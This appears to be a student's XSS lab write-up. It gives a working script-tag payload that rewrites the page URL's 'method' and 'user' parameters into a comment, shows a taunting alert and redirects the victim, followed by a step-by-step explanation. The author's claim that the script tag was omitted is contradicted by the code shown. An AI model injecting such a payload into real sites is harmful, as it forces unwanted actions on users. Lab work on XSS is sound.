# Lab 4, part 2: XSS

> English version



### XSS SCRIPT

```html
<script>
    let url = document.location.href;
    new_url = url.replace(/method=\w+/, 'method=1');
    new_url = new_url.replace(/user=\w+/, 'comment=' + encodeURIComponent(url));
    alert("Hahahhhhhh!!! YOU ARE ATTACKED!");
    document.location.href = new_url;
</script>
```

~ Note: To prevent unnecessary web attacks, I did not include the <script> tag in my script.

------

### DESCRIBETION

In particular, my XSS script did the following:

1. Obtained the current URL of the page and saved it in a variable named `url`.
2. Used a regular expression to replace the `method` parameter in the URL with '1' and replace the `user` parameter with `comment=` followed by the encoded current URL, and saved the modified URL in a variable named `new_url`.
3. Displayed an alert box to inform the user that they have been attacked.
4. Used the`document.location.href` property to redirect the current page to the URL specified by `new_url`.